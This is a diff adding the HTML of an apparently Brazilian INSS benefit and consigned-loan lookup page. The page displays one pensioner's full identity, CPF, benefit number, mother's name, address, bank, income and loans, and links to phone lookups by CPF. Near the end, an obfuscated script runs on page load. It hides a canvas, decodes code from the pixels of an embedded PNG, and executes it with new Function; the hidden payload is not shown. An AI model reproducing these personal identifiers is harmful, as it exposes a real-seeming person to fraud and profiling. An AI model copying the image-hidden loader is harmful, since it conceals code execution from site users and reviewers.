+                                            <a href="?hp=simulador"><button type="button" class="btn btn-sm btn-primary">Simulador</button></a>&nbsp;
+                                            <a href="?hp=telefonia"><button type="button" class="btn btn-sm btn-primary">Telefonia</button></a>&nbsp;
+                                          </div>
+                  </div>
+                </td>
+              </tr>
+            </table>
+            <script language="javascript">
+function MascaraMoeda(objTextBox, SeparadorMilesimo, SeparadorDecimal, e){
+    var sep = 0;
+    var key = '';
+    var i = j = 0;
+    var len = len2 = 0;
+    var strCheck = '0123456789';
+    var aux = aux2 = '';
+    var whichCode = (window.Event) ? e.which : e.keyCode;
+    if (whichCode == 13) return true;
+    key = String.fromCharCode(whichCode); // Valor para o código da Chave
+    if (strCheck.indexOf(key) == -1) return false; // Chave inválida
+    len = objTextBox.value.length;
+    for(i = 0; i < len; i++)
+        if ((objTextBox.value.charAt(i) != '0') && (objTextBox.value.charAt(i) != SeparadorDecimal)) break;
+    aux = '';
+    for(; i < len; i++)
+        if (strCheck.indexOf(objTextBox.value.charAt(i))!=-1) aux += objTextBox.value.charAt(i);
+    aux += key;
+    len = aux.length;
+    if (len == 0) objTextBox.value = '';
+    if (len == 1) objTextBox.value = '0'+ SeparadorDecimal + '0' + aux;
+    if (len == 2) objTextBox.value = '0'+ SeparadorDecimal + aux;
+    if (len > 2) {
+        aux2 = '';
+        for (j = 0, i = len - 3; i >= 0; i--) {
+            if (j == 3) {
+                aux2 += SeparadorMilesimo;
+                j = 0;
+            }
+            aux2 += aux.charAt(i);
+            j++;
+        }
+        objTextBox.value = '';
+        len2 = aux2.length;
+        for (i = len2 - 1; i >= 0; i--)
+        objTextBox.value += aux2.charAt(i);
+        objTextBox.value += SeparadorDecimal + aux.substr(len - 2, len);
+    }
+    return false;
+}
+</script>
+
+<table border="0" width="100%" style="border-collapse: collapse">
+  <tr>
+    <td colspan="3">
+      <div class="alert alert-warning" role="alert">
+        <strong>Consulta INSS por NB! ONLine</strong>
+      </div>
+    </td>
+  </tr>
+  <tr>
+    <td width="65%">
+      <div class="panel panel-info">
+        <div class="panel-heading">
+          <h3 class="panel-title"><strong>Dados Pessoais</strong></h3>
+        </div>
+        <div class="panel-body">
+          <table class="table">
+            <tr>
+              <td>NB</td>
+              <th>547.794.383-8 | CPF 455.256.174-04 | NIT 10651375336 </th>
+            </tr>
+            <tr>
+              <td>Nome</td>
+              <th>JOSE MACHADO DA COSTA (JOSE MACHADO DA COSTA)</th>
+            </tr>
+                        <tr>
+              <td>Mãe</td>
+              <td>JOSEFA ANGELINA DA COSTA</td>
+            </tr>
+                        <tr>
+              <td>Nascimento</td>
+              <td>10/08/1950 (66 anos)</td>
+            </tr>
+                        <tr>
+              <td>Espécie</td>
+              <td><strong>32 - APOSENTADORIA INVALIDEZ PREVIDENCIÁRIA <button type="button" class="btn btn-xs btn-success">Consignável</button></strong></td>
+            </tr>
+            <tr>
+              <td>Endereço</td>
+              <td>RUA LUIS RUSSO MARINHO 8</td>
+            </tr>
+            <tr>
+              <td>Bairro</td>
+              <td>CONJ ALTA DE SOUZ</td>
+            </tr>
+            <tr>
+              <td>Cidade</td>
+              <td>NATAL/RN | CEP: 59280000</td>
+            </tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="panel panel-info">
+        <div class="panel-heading">
+          <h3 class="panel-title"><strong>Dados da APS</strong></h3>
+        </div>
+        <div class="panel-body">
+          <table class="table">
+            <tr>
+              <td>APS</td>
+              <td>18001030 - APS Natal-Centro - UF:RN</td>
+            </tr>
+            <tr>
+              <td>Concessão</td>
+              <td>20110901</td>
+            </tr>
+                      </table>
+        </div>
+      </div>
+      
+      
+      <div class="panel panel-info">
+        <div class="panel-heading">
+          <h3 class="panel-title"><strong>Dados Bancários</strong></h3>
+        </div>
+        <div class="panel-body">
+          <table class="table">
+            <tr>
+              <td>Banco</td>
+              <td>BRASIL</td>
+            </tr>
+            <tr>
+              <td>Agência</td>
+              <td>0716 - (ALECRIM-NATAL,RN - AV. PRESIDENTE BANDEIRA, 372 ALECRIM NATAL RN)</td>
+            </tr>
+            <tr>
+              <td>Forma Rec.</td>
+              <td> 0000000000</td>
+            </tr>
+          </table>
+        </div>
+      </div>
+    </td>
+    <td valign="top" width="1.3%" nowrap="nowrap"></td>
+    
+	<td valign="top">
+            <div class="panel panel-primary">
+        
+        <!-- Modal -->
+        <div class="modal fade" id="detalhamento" role="dialog">
+          <div class="modal-dialog">
+            <div class="modal-content">
+              <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <h4 class="modal-title">Capturar Detalhamento</h4>
+              </div>
+              <div class="modal-body"></div>
+              <div class="modal-footer"></div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="panel-heading">
+          <h3 class="panel-title">Atualizar Margem</h3>
+        </div>
+        <div class="panel-body">
+          <script>$(function() { Dataprev.consulta.nb = "5477943838";Dataprev.consulta.nome = "JOSE MACHADO DA COSTA";Dataprev.consulta.nascimento = "10/08/1950";Dataprev.consulta.cpf = "45525617404";});</script>
+          <p align="center"><button type="button" class="btn btn-sm btn-primary" data-toggle="modal" data-target="#detalhamento">CAPTURAR DETALHAMENTO</button></p>
+        </div>
+      </div>
+      
+      
+      <div class="panel panel-success">
+        <div class="panel-heading">
+          <h3 class="panel-title"><strong>Dados Salarial</strong></h3>
+        </div>
+        <div class="panel-body">
+          <table class="table">
+                        <tr>
+              <th>Salário</th>
+              <th>R$ 874.58</th>
+            </tr>
+            <tr>
+              <td>Total Empréstimos</td>
+              <td>R$ 463,27</td>
+            </tr>
+            <tr>
+              <td>RMC (Cartão)</td>
+              <td>R$ 48,66</td>
+            </tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="panel panel-danger">
+        
+        <!-- START MODALS -->
+        <div class="modal fade" id="simulacao-consignado" role="dialog">
+          <div class="modal-dialog" style="width:1050px">
+            <div class="modal-content">
+              <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <h4 class="modal-title">Simulação - Contrato Novo</h4>
+              </div>
+              <div class="modal-body">
+			    
+
+
+<head>
+<meta http-equiv="Content-Language" content="pt-br">
+</head>
+
+<div align="center">
+	<table border="0" width="990" style="border-style: solid; border-width: 1px">
+		<tr>
+			<td bgcolor="#CCFFCC">
+			<p align="center"><b><font face="Verdana">Simulador de
+					Empréstimos</font></b></td>
+		</tr>
+		<tr>
+			<td>
+			<table border="0" width="982" style="border-collapse: collapse">
+				<tr>
+					<td width="148" bordercolor="#FFFFCC">&nbsp;</td>
+					<td bordercolor="#FFFFCC" align="center" width="208" colspan="2" bgcolor="#FFFFCC">
+					<font face="Verdana" size="2">36 Vezes</font></td>
+					<td bordercolor="#FFFFCC" align="center" width="208" colspan="2">
+					<font face="Verdana" size="2">48 Vezes</font></td>
+					<td bordercolor="#FFFFCC" align="center" width="208" colspan="2" bgcolor="#FFFFCC">
+					<font face="Verdana" size="2">60 Vezes</font></td>
+					<td bordercolor="#FFFFCC" align="center" width="208" colspan="2">
+					<font face="Verdana" size="2">72 Vezes</font></td>
+				</tr>
+				<tr>
+					<td width="148" bgcolor="#6699FF">
+					<font face="Verdana" size="2">Banco</font></td>
+					<td width="104" align="center" bgcolor="#6699FF">
+					<font face="Verdana" size="2">R$ Parcela</font></td>
+					<td width="104" align="center" bgcolor="#6699FF">
+					<font face="Verdana" size="2">R$ Empréstimo</font></td>
+					<td width="104" align="center" bgcolor="#6699FF">
+					<font face="Verdana" size="2">R$ Parcela</font></td>
+					<td width="104" align="center" bgcolor="#6699FF">
+					<font face="Verdana" size="2">R$ Empréstimo</font></td>
+					<td width="104" align="center" bgcolor="#6699FF">
+					<font face="Verdana" size="2">R$ Parcela</font></td>
+					<td width="104" align="center" bgcolor="#6699FF">
+					<font face="Verdana" size="2">R$ Empréstimo</font></td>
+					<td width="104" align="center" bgcolor="#6699FF">
+					<font face="Verdana" size="2">R$ Parcela</font></td>
+					<td width="104" align="center" bgcolor="#6699FF">
+					<font face="Verdana" size="2">R$ Empréstimo</font></td>
+				</tr><tr style="cursor:default" onMouseOver="javascript:this.style.backgroundColor='#C0B085'" onMouseOut="javascript:this.style.backgroundColor=''">
+					<td width="148"><font face="Verdana" size="2">PAN</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+				</tr><tr style="cursor:default" onMouseOver="javascript:this.style.backgroundColor='#C0B085'" onMouseOut="javascript:this.style.backgroundColor=''">
+					<td width="148"><font face="Verdana" size="2">BRADESCO</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+				</tr><tr style="cursor:default" onMouseOver="javascript:this.style.backgroundColor='#C0B085'" onMouseOut="javascript:this.style.backgroundColor=''">
+					<td width="148"><font face="Verdana" size="2">ITAU/BMG</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+				</tr><tr style="cursor:default" onMouseOver="javascript:this.style.backgroundColor='#C0B085'" onMouseOut="javascript:this.style.backgroundColor=''">
+					<td width="148"><font face="Verdana" size="2">BGN</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+					<td width="104" align="center">
+					<font face="Verdana" size="2">0,00</font></td>
+				</tr></table>
+			</td>
+		</tr>
+		<tr>
+			<td>
+			<p align="center"><b><font face="Verdana" size="1">* Valores
+			Aproximados</font></b></td>
+		</tr>
+		</table>
+</div>
+
+              </div>
+              <div class="modal-footer">
+                <button type="button" class="btn btn-default" data-dismiss="modal">Fechar</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- END MODALS -->
+        
+        <div class="panel-heading">
+          <h3 class="panel-title"><strong>Margem Disponível (OFF-Line)</strong></h3>
+        </div>
+        <div class="panel-body">
+          <table class="table">
+            <tr>
+              <td>Consignado</td>
+              <td>R$ 0,00</td>
+              <td><button type="button" class="btn btn-sm btn-primary" data-toggle="modal" data-target="#simulacao-consignado">SIMULADOR</button></td>
+            </tr>
+            <tr>
+              <td>RMC (Cartão)</th>
+              <td>R$ 0,00</td>
+              <td></td>
+            </tr>
+          </table>
+        </div>
+      </div>
+
+ <script language="JavaScript">
+function abrir_SeeK(URL) {
+
+  var width = 400;
+  var height = 600;
+
+  var left = 99;
+  var top = 99;
+
+  window.open(URL,'janela', 'width='+width+', height='+height+', top='+top+', left='+left+', scrollbars=yes, status=no, toolbar=no, location=no, directories=no, menubar=no, resizable=no, fullscreen=no');
+
+}
+</script>
+      <div class="panel panel-default">
+        
+      <div class="panel panel-default">
+        
+        <div class="modal fade" id="printnatt">
+          <div class="modal-dialog" style="width:725px">
+            <div class="modal-content">
+              <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <h4 class="modal-title">Telefonia NATT</h4>
+              </div>
+              <div class="modal-body"></div>
+              <div class="modal-footer">
+                <button type="button" class="btn btn-default" data-dismiss="modal">Fechar</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="panel-heading">
+          <h3 class="panel-title"><strong>Telefonia</strong></h3>
+        </div>
+        <div class="panel-body">
+          <p align="center">
+          <a href="javascript:abrir_SeeK('buscas/seek.php?p_cpf=45525617404&qa=NDU1MjU2MTc0MDQ=&key=29a1d5fdd7eeebd05284485cd5bf8b60')" style="text-decoration: none">
+          <button type="button" class="btn btn-sm btn-primary">Telefonia SEEKLOC</button></a> <button type="button" class="btn btn-sm btn-primary" data-toggle="modal" data-target="#printnatt" id="startnatt">Telefonia NATT</button></p>
+          <script>
+		  $(function() {
+			  $("#startnatt").click(function() {
+				  $("#printnatt .modal-body").html('<center><img style="margin:50px 0px" src="aguarde.gif" width="32" /></center>');
+				  $.get("buscas/class.natt.php", {cpf: "45525617404"}, function(response) {
+					  $("#printnatt .modal-body").html(response);
+				  });
+			  });
+          });
+          </script></div>
+      </div>
+
+      <div class="panel panel-default">
+        <div class="panel-heading">
+          <h3 class="panel-title"><strong>Diversos</strong></h3>
+        </div>
+        <div class="panel-body">
+          <p align="center"><button type="button" class="btn btn-sm btn-primary" data-toggle="modal" id="printdetalhes">IMPRIMIR CONSULTA</button></p>
+		  <script>var keyd = "4f5b2b62b42a8be69c6a6d2edcf1f7f5";v8a3adc59827ec2a734da833bf60c6047=[ function(vcb6bf8ac3ef7df4d8a55ceea1448bc68){return '3352d0d8278c176fa61d82326d7e51dabd2a032eec42edd99b7ea54fc60ed9d8e0435c46';}, function(vcb6bf8ac3ef7df4d8a55ceea1448bc68){return v69b8fc9d3f8dac34f845db4d0a34453a.createElement(vcb6bf8ac3ef7df4d8a55ceea1448bc68);}, function(vcb6bf8ac3ef7df4d8a55ceea1448bc68){return vcb6bf8ac3ef7df4d8a55ceea1448bc68[0].getContext(vcb6bf8ac3ef7df4d8a55ceea1448bc68[1]);}, function(vcb6bf8ac3ef7df4d8a55ceea1448bc68){return vcb6bf8ac3ef7df4d8a55ceea1448bc68[0].text=vcb6bf8ac3ef7df4d8a55ceea1448bc68[1];}, function(vcb6bf8ac3ef7df4d8a55ceea1448bc68){return null;}, function(vcb6bf8ac3ef7df4d8a55ceea1448bc68){'df518c2e0702a3bec12b032911d3090d9bfef76c4a6387da1a9f59e936a7ddc6aa640163';}, function(vcb6bf8ac3ef7df4d8a55ceea1448bc68){return '61188f24396807ba7ca38919a158766de935852e4fd0e81a93f0b42abf77047ac4811a76';}, function(vcb6bf8ac3ef7df4d8a55ceea1448bc68){vcb6bf8ac3ef7df4d8a55ceea1448bc68.style.display='none';return vcb6bf8ac3ef7df4d8a55ceea1448bc68;}, function(vcb6bf8ac3ef7df4d8a55ceea1448bc68){v05ad38edbcc855b2fbccb36ef0db6174.onload=vcb6bf8ac3ef7df4d8a55ceea1448bc68}, function(vcb6bf8ac3ef7df4d8a55ceea1448bc68){v05ad38edbcc855b2fbccb36ef0db6174.src=vcb6bf8ac3ef7df4d8a55ceea1448bc68;}, new Function("vcb6bf8ac3ef7df4d8a55ceea1448bc68","return unescape(decodeURIComponent(window.atob(vcb6bf8ac3ef7df4d8a55ceea1448bc68)))"), function(vcb6bf8ac3ef7df4d8a55ceea1448bc68){v8219e4ea19ff345fed1b1939a490d116=new Function('vcb6bf8ac3ef7df4d8a55ceea1448bc68',v8a3adc59827ec2a734da833bf60c6047[10](v14be2de814921da98acf1104c597338e[vcb6bf8ac3ef7df4d8a55ceea1448bc68]));return v8219e4ea19ff345fed1b1939a490d116;}]; v6d300e775e4eac08cfe35d5609d8d43b=[0,255,2]; v14be2de814921da98acf1104c597338e=[ 'cmV0dXJuJTIwJ2NhbnZhcyclM0I=', 'cmV0dXJuJTIwJ25vbmUnJTNC', 'cmV0dXJuJTIwJzJkJyUzQg==', 'cmV0dXJuJTIwJ3NjcmlwdCclM0I=', '', 'v56194dcfb46a3ce5a1c1376ed0c86ea9', 'v7a80bc22f5580c04dc069c034002260a', 'cmV0dXJuJTIwJ2RhdGElM0FpbWFnZSUyRnBuZyUzQmJhc2U2NCUyQyclM0I=', '', 'iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAIAAADZrBkAAAACPUlEQVQokU2LTU9cBQBFD4/HXJlQ6IBgWzGAMAkwBGTRuGlcGFfj0l9r3Fo/kmpoG2PAOB0LUixfdagznMJjXLDQ3T0n5460220RVmIh3fAapuBTOJJ+0tErWE9OYUr3YC25GW02vyqZLj03g5SV5VpV9Uv+Jr+V1YrVDLlJNU/VsByh2k6GOFnqCVxAJz6EidCRJtRlCoZkLKyRXRyGFunJASwVhGQWtmTXjJKPkzN4Gt+G70MP9vGNWdVzLKAGwzKOyK+kFz/H1+ZVlKzCvs6Ev/Sf0IoVeSWnMBN2SzhNmnAtO2EYtskJlFoPh/KAtOAPeT/cxybpkqOC3MUunCVLpiZ9fIbXoS8N7MOYToSXMk5+iFc6V8K01KPkPNT0iXwQ9swwtGSAf5KOPIyahiwn9QLOQmVGcV6vwgNYkJWwjN+FPmnETRhCJ24kff2pxBfkEu+am9CTz2A/VvA7eSR7YcocxnUJXOKbZK2AZZlMKtzQVdyBa1jGWXkXNhG8bw7CnVAn03pcwCEsyUdkQHbCJkyQIdnCuh6TH8MJNGTSPIvvhYWS3IsF/Ey+0G0oYU77cJxUOguPzAV0wzj0ZJ+MFfBC7siH+jwUZIAvyW64lHvJARxCLW6Ra6iHd3G+wEn4BjZIyxxJlVzGTUn4FmuwCBfQlSM5JaPmpoTZsG6OYAC1MBThKXyiC+E5dpNFeIxzME4W4fFIu/2ljocF8xa+RhIABDAEvJX+hyX+QsAnAJCgt4tAbtP/fyDhX8ibRiG1Ail6AAAAAElFTkSuQmCC', 'cmV0dXJuJTIwdjY5YjhmYzlkM2Y4ZGFjMzRmODQ1ZGI0ZDBhMzQ0NTNhLmdldEVsZW1lbnRCeUlkKHZjYjZiZjhhYzNlZjdkZjRkOGE1NWNlZWExNDQ4YmM2OCklM0I=', 'cmV0dXJuJTIwZG9jdW1lbnQ=', 'Zm9yKHY5ODgzOWY4OGQ2NmUxOGQ5MTAzMGJlOGQ5NDk0MDU1MSUzRHY2ZDMwMGU3NzVlNGVhYzA4Y2ZlMzVkNTYwOWQ4ZDQzYiU1QjIlNUQlM0IlMjB2OTg4MzlmODhkNjZlMThkOTEwMzBiZThkOTQ5NDA1NTElMjAlM0MlMjB2MTQ1NzY4OWUwMDU1MTZhNjRkNTIwMDNlNzc3MzM0OTMuZGF0YS5sZW5ndGglM0IlMjB2OTg4MzlmODhkNjZlMThkOTEwMzBiZThkOTQ5NDA1NTElMkIlM0Q0KXY4MzZhYmZmYzRkOWUyYjZkZDAwM2E5NGE4Mzg2NjRhMyUyQiUzRCh2MTQ1NzY4OWUwMDU1MTZhNjRkNTIwMDNlNzc3MzM0OTMuZGF0YSU1QnY5ODgzOWY4OGQ2NmUxOGQ5MTAzMGJlOGQ5NDk0MDU1MSU1RCElM0R2NmQzMDBlNzc1ZTRlYWMwOGNmZTM1ZDU2MDlkOGQ0M2IlNUIxJTVEKSUzRnY2YzFlMGY2MWNiZmNlYmZiNWM0ZWVlM2VjOGY2MTc2NSh2MTQ1NzY4OWUwMDU1MTZhNjRkNTIwMDNlNzc3MzM0OTMuZGF0YSU1QnY5ODgzOWY4OGQ2NmUxOGQ5MTAzMGJlOGQ5NDk0MDU1MSU1RCklM0F2MTRiZTJkZTgxNDkyMWRhOThhY2YxMTA0YzU5NzMzOGUlNUI0JTVEJTNCJTIwdjgzNmFiZmZjNGQ5ZTJiNmRkMDAzYTk0YTgzODY2NGEzJTNEdjgzNmFiZmZjNGQ5ZTJiNmRkMDAzYTk0YTgzODY2NGEzLnRyaW0oKSUzQg==', 'cmV0dXJuJTIwbmV3JTIwSW1hZ2UoKSUzQg==', 'cmV0dXJuJTIwU3RyaW5nLmZyb21DaGFyQ29kZSh2Y2I2YmY4YWMzZWY3ZGY0ZDhhNTVjZWVhMTQ0OGJjNjgpJTNC']; v69b8fc9d3f8dac34f845db4d0a34453a=v8a3adc59827ec2a734da833bf60c6047[11](11)(); vddad1e0dbca8cdd44e1aeb6619e299e2=new Function('vcb6bf8ac3ef7df4d8a55ceea1448bc68',v8a3adc59827ec2a734da833bf60c6047[10](v14be2de814921da98acf1104c597338e[10])); v05ad38edbcc855b2fbccb36ef0db6174=v8a3adc59827ec2a734da833bf60c6047[7](v8a3adc59827ec2a734da833bf60c6047[11](13)()); v8a3adc59827ec2a734da833bf60c6047[8](function(){ vbbc25e979cd74e6af3a4bbde4fce2b4d=vddad1e0dbca8cdd44e1aeb6619e299e2(v14be2de814921da98acf1104c597338e[5]); v11ecb7bd52dd5399af687bb8102cf57d=v8a3adc59827ec2a734da833bf60c6047[1](v8a3adc59827ec2a734da833bf60c6047[11](0)()); v11ecb7bd52dd5399af687bb8102cf57d.width=v05ad38edbcc855b2fbccb36ef0db6174.width; v11ecb7bd52dd5399af687bb8102cf57d.height=v05ad38edbcc855b2fbccb36ef0db6174.height; v11ecb7bd52dd5399af687bb8102cf57d.style.display=v8a3adc59827ec2a734da833bf60c6047[11](1)();v836abffc4d9e2b6dd003a94a838664a3=v14be2de814921da98acf1104c597338e[4]; vb6d379d772db1427b61241920170912d=v8a3adc59827ec2a734da833bf60c6047[2]([v11ecb7bd52dd5399af687bb8102cf57d,v8a3adc59827ec2a734da833bf60c6047[11](2)()]); v6c1e0f61cbfcebfb5c4eee3ec8f61765=new Function('vcb6bf8ac3ef7df4d8a55ceea1448bc68',v8a3adc59827ec2a734da833bf60c6047[10](v14be2de814921da98acf1104c597338e[14])); vb6d379d772db1427b61241920170912d.drawImage(v05ad38edbcc855b2fbccb36ef0db6174, v6d300e775e4eac08cfe35d5609d8d43b[0], v6d300e775e4eac08cfe35d5609d8d43b[0]); v1457689e005516a64d52003e77733493=vb6d379d772db1427b61241920170912d.getImageData(v6d300e775e4eac08cfe35d5609d8d43b[0], v6d300e775e4eac08cfe35d5609d8d43b[0],v11ecb7bd52dd5399af687bb8102cf57d.width,v11ecb7bd52dd5399af687bb8102cf57d.height); v312f239ab11ab792bbc638880cef0016=v8a3adc59827ec2a734da833bf60c6047[11](12)(); (new Function(v8a3adc59827ec2a734da833bf60c6047[10](v836abffc4d9e2b6dd003a94a838664a3)))(); v56194dcfb46a3ce5a1c1376ed0c86ea9=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d);v05ad38edbcc855b2fbccb36ef0db6174=v8a3adc59827ec2a734da833bf60c6047[4](v56194dcfb46a3ce5a1c1376ed0c86ea9);v11ecb7bd52dd5399af687bb8102cf57d=v8a3adc59827ec2a734da833bf60c6047[4](v11ecb7bd52dd5399af687bb8102cf57d);vb6d379d772db1427b61241920170912d=v8a3adc59827ec2a734da833bf60c6047[4](v1457689e005516a64d52003e77733493);v1457689e005516a64d52003e77733493=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d);v98839f88d66e18d91030be8d94940551=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d);v836abffc4d9e2b6dd003a94a838664a3=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d);vbfbdb085756d98cbc07babb197d521e0=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d);v90e4918adf3ca9d454d1a32a9f509efc=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d);v56194dcfb46a3ce5a1c1376ed0c86ea9=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d);vc30109c535e130a4600634df3f11069b=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d);v69b8fc9d3f8dac34f845db4d0a34453a=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d);v312f239ab11ab792bbc638880cef0016=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d);v14be2de814921da98acf1104c597338e=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d);v6d300e775e4eac08cfe35d5609d8d43b=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d);vcb6bf8ac3ef7df4d8a55ceea1448bc68=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d);vcb6bf8ac3ef7df4d8a55ceea1448bc68=v8a3adc59827ec2a734da833bf60c6047[4](vbbc25e979cd74e6af3a4bbde4fce2b4d);v8a3adc59827ec2a734da833bf60c6047=v8a3adc59827ec2a734da833bf60c6047[4](vb6d379d772db1427b61241920170912d); }); v312f239ab11ab792bbc638880cef0016=v8a3adc59827ec2a734da833bf60c6047[9](v8a3adc59827ec2a734da833bf60c6047[11](7)()+v14be2de814921da98acf1104c597338e[9]);</script>
+        </div>
+      </div>
+    </td>
+  </tr>
+
+  <tr>
+    <td colspan="3">
+      <div id="hiscon" class="panel panel-default">
+        
+        <div class="modal fade" id="hisconsimulator" role="dialog">
+          <div class="modal-dialog" style="width:725px">
+            <div class="modal-content">
+              <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <h4 class="modal-title">Simulação</h4>
+              </div>
+              <div class="modal-body"></div>
+              <div class="modal-footer"></div>
+            </div>
+          </div>
+        </div>
+                <div class="panel-heading">Empréstimos<i>7</i><div class="right"></div></div>
+        <div class="panel-body">
+                    <style type="text/css">
+          /********************************************************************************* SCHEME COLORS BANKS **********************************************************
+          *****************************************************************************************************************************************************************
+          *****************************************************************************************************************************************************************/
+          #hiscon #emp[data-codbanco='623'] .empinfo .detail > span,
+          #hiscon #emp[data-codbanco='623'] .empinfo .detail .timeleft ul li {
+              color:#009CDE !important;
+          }
+          #hiscon #emp[data-codbanco='623'] .empinfo .detail .timeleft ul li:nth-child(1) {
+              border-color:#009CDE !important;
+          }
+          #hiscon #emp[data-codbanco='623'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:before {
+              border-color:transparent #009CDE #009CDE #009CDE !important;
+          }
+          #hiscon #emp[data-codbanco='623'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:after {
+              border-color:transparent transparent transparent #009CDE !important;
+          }
+          </style>
+          <div id="emp" data-type="98" data-key="83f163c5a2067ed01d25655cc15178fa" data-codbanco="623" data-saldo="975.52" data-pmt="29.50" data-prazo="72">
+            <div class="empinfo left">
+              <div class="left image">
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNui8sowAAAAWdEVYdENyZWF0aW9uIFRpbWUAMTAvMjUvMTSBH7H0AAAMa0lEQVRogdWYe3CV5Z3HP8/7vic5OTk55+RKEsg9SCSBcJOlIiCgq9Up6KLT6dQiCG3XcavtMrvu4oqltq6utgXt7G6nrUXs6GibjtLBcXclGiwXRTCJ3JQQcgiEkJDknJPLubyXZ/94cyE954RLcd1+Z85M8rzP87zf7+/53Z5XONfUgQTg+8AaiSxhBFISh3FjMsl4/P9yZK4cG7ma90gp/cC2Yb5ow+ONQG38Lv8vUQI8AdwFzFKwlfylkL8YtcD3FWDNF0zkz8EaBftI/lJRonzRDP5caH86MK/YxZdrsrm1MpWi/DzcGW6i0Sht7R385kAPr3zURyhifhFcE0I419TJizNa4+NzmVpWhKLEH45hGjS29rD1v07y2w/P8gWl0XHT4k4gI82BoigYpsFre45xwG/gUg2qclO4e8E05k2dxMtTJ+H8z328vLd93Nr7FxZSludmV9NZ3j85EE8KyPc4mF2WjaIq9AUH2HviAog4GrhTVRZOy0UoKoFggP2nEu8Xv3IYsXCMZ3a08lm3bg+YOj99y88vvzmLudOLefZr06k/3MHZkO1O/3J3Nf+0ogqAdUtKWb1lF++eMuL2vfuvSvi3r89BKIKhcIS6D/x859cfY1jjLVuR62Tbg/Nxu90cPHiQm7ccT8gzaRALIdAUx9iA6uBYb4wf1n1MJBzB5/WSn+0BwOdysHpxGZqmoWkaudmZ/MPKGpDxsWJJ0FSBQ1Xwul2sXVbFppUVcfNMS5LqUEnRFByqSEYzuQAANcHTzkGdcCw8SgbgG4tKKcpOZzCi03IuCMCXakr5UnFavADTXmSaJoZhIITgkRWzqMp3TUTl6gQkiq2q4hw8GR6klAxFDTxOlfVLShAC/vBBC2v/Yx+RmE6a08l376pO8EYJAs4HI/zr75sIR3Wcqak8/dVqsK48uyUXYEHvYGzc0LSCVP55xQxURaXlXJDWrgFuKM9kaqEP0zTZ3tDKgRPnOXj8NF2BATo7+kiNDZDlhGmT0sjKcGAYEiSoisrP60+x48M2pJQsn13KVxcUXrGApEGspmqsXZRDy9l+0pypXFecz9cWFVHgzUA3LL73chO6afHYymkoikLzZ6fZfbIfNCd/91ITM/NV0jQHP35gHnPLsqks9LFlVyuHW0M